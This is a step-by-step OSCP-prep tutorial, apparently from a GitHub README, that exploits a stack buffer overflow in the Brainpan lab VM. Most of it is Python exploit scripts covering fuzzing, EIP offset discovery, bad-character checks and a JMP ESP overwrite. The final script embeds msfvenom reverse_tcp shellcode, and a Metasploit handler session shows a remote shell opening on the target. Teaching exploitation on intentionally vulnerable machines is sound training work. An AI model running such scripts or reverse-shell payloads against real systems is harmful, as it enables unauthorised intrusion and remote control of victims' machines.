# Buffer Overflow - A Pre-OSCP BOF Prep Guide
A common hesitation when stepping into the Penetration Testing with Kali (PWK) course is the section on buffer overflow (BOF) exploits. This course does not expect you to do any advanced exploit writing, but does teach and sets the expectation that you'll understand the basics by the time you sit for the exam and if you're coming into this green, then you may feel a bit intimidated.

Offensive Security does a fantastic job at explaining the process at a quality you will not find anywhere else, but I would recommend getting your feet wet before you commit and purchase your lab time. 

Before I went through the PWK course, I went through every BOF article, video and machines I could find to keep everything fresh, but I went a bit overboard. To help simplify the process, before I started the PWK course, I wrote myself a detailed guide from beginning to end so that when I get to the course, I would have the foundations solidified by the time I stepped into the course.

It is my hope that if you're looking to start your journey into OSCP that you will find this helpful. In a nutshell, what we want to accomplish is to crash the application, inject our code and instruct it to execute our shellcode. Simple right? Let’s go! 

## Steps:
1. Crash The Application
2. Find EIP
3. Control ESP
4. Identify Bad Characters 
5. Find JMP ESP
6. Generate Shell Code
7. Exploit

## Definitions:
1. EIP - The Extended Instruction Pointer (EIP) is a register that contains the address of the next instruction for the program or command.
2. ESP – The Extended Stack Pointer (ESP) is a register that lets you know where on the stack you are and allows you to push data in and out of the application.
3. JMP – The Jump (JMP) is a register that performs an unconditional jump to transfer the flow of execution by changing the EIP register.
4. \x41, \x42, \x43 - The hexadecimal values for A, B and C. For this exercise, there is no benefit to using hex vs ascii, it's just my personal preference.

## Prerequisites:
1. Kali Linux VM <https://www.kali.org/downloads/>
2. Brainpan VM <https://www.vulnhub.com/entry/brainpan-1,51/>
3. Wine 32 Bit (apt install wine32)
4. ollydbg
5. Skeleton Python Script

## Using Ollydbg
There are a lot of different ways you can use ollydbg, but for this use case we'll keep it the bare minimum. You start the application by launching a terminal and type ollydbg and press enter. 

* To load the brainpan.exe, click file > open > brainpan.exe. Take note in the screenshot below on the bottom right, binaries are loaded in a paused state. To launch the binary, press the blue play button on the top menu bar.

* To easily reload brainpan.exe after crashing, press the black left arrow on the top menu bar and click yes on the process is still active warning.

* The EIP/ESP registers we'll be working with are on the right side of the application.

![Alt text](https://github.com/gh0x0st/Buffer_Overflow/blob/master/Screenshots/ollydbg_base.png?raw=true "Ollydbg")

## Skeleton Python Script
The easiest way to stay organized when writing these scripts is to use a skeleton file. The below is the going to be your working grounds for the rest of these exercises. I recommend that after each step has been completed, you create a copy of the script and name it at the step you completed. This way, if you get stuck, you can go back to a working step.

```Python
#!/usr/bin/python 

import socket,sys

address = '127.0.0.1'
port = 9999
buffer = #TBD

try:
	print '[+] Sending buffer'
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((address,port))
	s.recv(1024)			
	s.send(buffer + '\r\n')
except:
 	print '[!] Unable to connect to the application.'
 	sys.exit(0)
finally:
	s.close()
```

## Explanation:

### 1. Crash the application 

To start with our buffer overflow, we need to identify how much data we must send to cause the application to crash. This application binds to port 9999 we are using a python script (fuzz.py) to accomplish this. You can modify fuzz.py to meet your needs but take note we are using the loopback address as we are launching brainpan.exe via Wine locally on our Kali machine.

This script will send \x41 (A) incrementally, 100 bytes at a time to port 9999 until it's no longer able to communicate with that port. In this case, the application appears to stop communicating around ~600 bytes. See our A's in the ESP?

![Alt text](https://github.com/gh0x0st/Buffer_Overflow/blob/master/Screenshots/step1_crash_the_app.png?raw=true "Crash The Application")

### 2. Find EIP

We are able to establish that we are able to crash the application with a relative number of bytes. Now we need to identify the exact number bytes that it takes to fill the buffer. Metasploit provides a ruby script called pattern_create.rb that will create a unique string with no repeating characters. After we send this payload to the buffer, it will display what the offset is which we'll use for the next step in finding the EIP.

```
root@gh0x0st:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9
```

You take the unique string from this script and that becomes your new buffer in bof_skel.py. 

```Python
#!/usr/bin/python 

import socket,sys

address = '127.0.0.1'
port = 9999
buffer = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9'

try:
	print '[+] Sending buffer'
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((address,port))
	s.recv(1024)			
	s.send(buffer + '\r\n')
except:
 	print '[!] Unable to connect to the application.'
 	sys.exit(0)
finally:
	s.close()
```

Send that payload to the application, make sure it crashed and grab the EIP value in the debugger. For this application, it will be 35724134. We will now use a second script from Metasploit called pattern_offset.rb. What this script will do is take that value and seeing exactly where it exists in the buffer length we designate, showing us the point where the buffer will crash. 

```
root@gh0x0st:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 35724134 -l 600
[*] Exact match at offset 524
```

### 3. Control ESP 

Now that know how much is needed to overflow the buffer, we will try to fill that buffer with our own data to verify that we can control it. What we're going to do next is send another custom buffer to the application.

```Python
#!/usr/bin/python 

import socket,sys

address = '127.0.0.1'
port = 9999
buffer = '\x41'*524 + '\x42'*4 + '\x43'*(600-524-4)

try:
	print '[+] Sending buffer'
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((address,port))
	s.recv(1024)			
	s.send(buffer + '\r\n')
except:
 	print '[!] Unable to connect to the application.'
 	sys.exit(0)
finally:
	s.close()
```
Let's break down that buffer:

* EIP - '\x41'*524 - The exact number of bytes to crash (As)
* ESP - '\x42'*4 - The value to overwrite the ESP register (Bs) 
* Our Code - '\x43'*(600-524-4) - (The difference between the number of bytes we know we can send from our fuzzing, the amount of bytes to crash (EIP) and the bytes sent to ESP (Cs). Eventually, C will become our payload.

![Alt text](https://github.com/gh0x0st/Buffer_Overflow/blob/master/Screenshots/step3_control_esp.png?raw=true "Crash The Application")

We sent our payload and were able to crash the application, and looking at the registers in the paused state you can see that we were able to take over the value of ESP.

A brief look at the C's shows that there's not much space there, likely under 100 bytes, which isn't enough room to put our shellcode which will likely be over 600 bytes. If we tried to upload shellcode without enough space, it'll get cut off and effectively fail to run. As a rule of thumb, I overshoot what's expected just to make sure I have the space to write over a larger section of memory. You can see the differences between the two below, and don't even have to scroll down to see the difference when you change to 1600 from 600.

~~~
buffer = '\x41'*524 + '\x42'*4 + '\x43'*(600-524-4)
~~~

![Alt text](https://github.com/gh0x0st/Buffer_Overflow/blob/master/Screenshots/step3_c_600.png?raw=true "\x43 * 600")

~~~
buffer = '\x41'*524 + '\x42'*4 + '\x43'*(1600-524-4)
~~~

![Alt text](https://github.com/gh0x0st/Buffer_Overflow/blob/master/Screenshots/step3_c_1600.png?raw=true "\x43 * 1600")

### 4. Bad Characters

Now that we know we can control the ESP and made room for our shellcode, we need to remove the possibility of any bad characters. What will happen is if a bad character is read in memory, everything found after the fact will get cut off and effectively not run. Your google fu for bad characters in buffer overflows will likely yield a reference to https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/ which will provide you a list of all bad characters.

~~~Python
#!/usr/bin/python 

import socket,sys

address = '127.0.0.1'
port = 9999
badchars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
buffer = '\x41'*524 + '\x42'*4 + badchars + "gh0x0st"
#buffer = '\x41'*524 + '\x42'*4 + '\x43'*(1600-524-4)

try:
	print '[+] Sending buffer'
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((address,port))
	s.recv(1024)			
	s.send(buffer + '\r\n')
except:
 	print '[!] Unable to connect to the application.'
 	sys.exit(0)
finally:
	s.close()
~~~

During this check, I like to add a string that you can easily recognize so you know you're at the end of the buffer or else you might find yourself scrolling for days if you're not familiar with this step. One thing to note, is that \x00 will always a be a bad character and will have to be excluded but it's a good habit to keep it there for your first run so you force yourself to check for all possible bad characters.

One piece to note is that \x0a (line feed) and \x0d (carriage return) are considered a best practice to treat as bad characters, even if they don't break the chain. Sometimes everything will work even if you don't exclude them, but it will not hurt you to exclude them along with \x00 so long as you have enough good characters to generate your shellcode. 

_If you designate an encoder and you happen to get a message saying there is no compatible encoder, remove that parameter from your command all together and msfvenom will look for all compatible encoders for you._

![Alt text](https://github.com/gh0x0st/Buffer_Overflow/blob/master/Screenshots/step4_bad_char_null.png?raw=true "bad characters")

What you're going to is send the payload with your bad characters, follow the ESP dump, and highlight starting from after the four Bs you sent and before gh0x0st like the above. What you're going to do is read the hex dump and find any value that are missing/out of order and whatever that value is supposed to be, will be a bad character we'll exclude during our shellcode generation. 

For example, if you see 01 02 04, then you can assume that there was a bad character in that string. Notate what that character was, exclude it from your buffer and keep going until it's all clean. The only bad character here is \x00 which will always be expected at least. 

### 5. Find JMP/ESP

Our next step here is to find a JMP ESP that we will use to tell the application to execute our code. Restart the application in ollydbg, search for all commands and find JMP ESP and find that offset. What will happen is we will tell our payload to use this offset and that will tell the program to execute our shell code. The jump will be B value in our buffer and we want it to execute C.

![Alt text](https://github.com/gh0x0st/Buffer_Overflow/blob/master/Screenshots/step5_search_all_commands.png?raw=true "Finding JMP")

![Alt text](https://github.com/gh0x0st/Buffer_Overflow/blob/master/Screenshots/step5_jmp_esp.png?raw=true "JMP ESP Value")

Now that we have our JMP ESP value, we'll use that to replace the value we're putting in for the ESP in our buffer. Remember, in this case we are running a x86 application, so we must pass the JMP ESP value in little endian format.

~~~Python
#!/usr/bin/python 

import socket,sys

address = '127.0.0.1'
port = 9999
#JMP ESP Value is 311712F3
buffer = '\x41'*524 + '\xF3\x12\x17\x31' + '\x43'*(1600-524-4)

try:
	print '[+] Sending buffer'
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((address,port))
	s.recv(1024)			
	s.send(buffer + '\r\n')
except:
 	print '[!] Unable to connect to the application.'
 	sys.exit(0)
finally:
	s.close()
~~~

If you want to make sure your code is getting to that jump correctly, set a breakpoint on the JMP ESP you picked and execute your script. If everything is coded correctly, it should stop at that point.

### 6. Generate Shell Code

All of the work we just did debugging brainpan.exe has led up to the moment where we are in a position where we can generate and execute our shell code. We'll use msfvenom to generate our payload, which includes listing our bad characters, your Kali IP and port and add it to our script. 

~~~
root@gh0x0st:~# msfvenom -p linux/x86/meterpreter/reverse_tcp -b \x00 LHOST=192.168.1.9 LPORT=4444 -f python
~~~

~~~Python
#!/usr/bin/python 

import socket,sys

address = '192.168.80.128'
port = 9999
buf =  ""
buf += "\xbb\xa2\xa5\x8e\xe5\xda\xd7\xd9\x74\x24\xf4\x5f\x29"
buf += "\xc9\xb1\x1f\x31\x5f\x15\x83\xc7\x04\x03\x5f\x11\xe2"
buf += "\x57\xcf\x84\xbb\xa6\xcb\x6e\xa0\x9b\xa8\xc3\x4d\x19"
buf += "\x9f\x82\x18\xfc\x12\xca\x8c\xa5\xc4\x0b\x1a\x09\x94"
buf += "\xe4\x59\xa9\x87\xa8\xd4\x48\xcd\x36\xbf\xda\x43\xe0"
buf += "\xb6\x3b\x20\xc3\x49\x3e\x67\xa2\x50\x0e\x1c\x68\x0b"
buf += "\x2c\xdc\x92\xcb\x68\xb7\x92\xa1\x8d\xce\x70\x04\x44"
buf += "\x1d\xf6\xe2\x96\xe7\x4a\x07\x31\xaa\xb2\x61\x3d\xda"
buf += "\xbc\x91\xb4\x39\x7d\x7a\xca\x7c\x9d\x71\x62\x03\xaf"
buf += "\x0a\x07\x3c\x57\x1b\x5c\x34\x49\x82\xd4\x4a\x3a\xb6"
buf += "\xd5\xd3\xbf\x79\x9d\xd1\x40\x98\xe5\xd7\xbe\x5b\x15"
buf += "\x63\xbf\x5b\x15\x93\x0d\xdb"

buffer = '\x41'*524 + '\xF3\x12\x17\x31' + '\x90'*20 + buf

try:
	print '[+] Sending buffer'
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((address,port))
	s.recv(1024)			
	s.send(buffer + '\r\n')
except:
 	print '[!] Unable to connect to the application.'
 	sys.exit(0)
finally:
	s.close()
~~~

Let's break down our final buffer:

* EIP - '\x41'*524 - The exact number of bytes to crash (As)
* ESP - '\xF3\x12\x17\x31' - The value of the JMP ESP that will instruct the application to execute our code
* NOP SLED - '\x90'*20 - There's a chance that our code may fall short slightly and get cut off. By adding a NOP sled, you're basically paving the way into our shellcode
* BUF - This is our shellcode that if we configured correctly, will get a reverse shell from the brainpan VM

Let's setup our handler, and run our script:

~~~
msf5 > use exploit/multi/handler 
msf5 exploit(multi/handler) > set payload linux/x86/shell/reverse_tcp
payload => linux/x86/shell/reverse_tcp
msf5 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf5 exploit(multi/handler) > set LHOST 192.168.80.182
LHOST => 192.168.80.182
msf5 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 192.168.80.129:4444 
[*] Sending stage (36 bytes) to 192.168.80.128
[*] Command shell session 1 opened (192.168.80.129:4444 -> 192.168.80.128:57489) at 2019-02-05 13:57:53 -0500

hostname
brainpan
~~~

There are many ways that execute buffer overflows, design the scripts and workflows, but this process is what allowed me to fully grasp the concepts. 

Gh0x0st
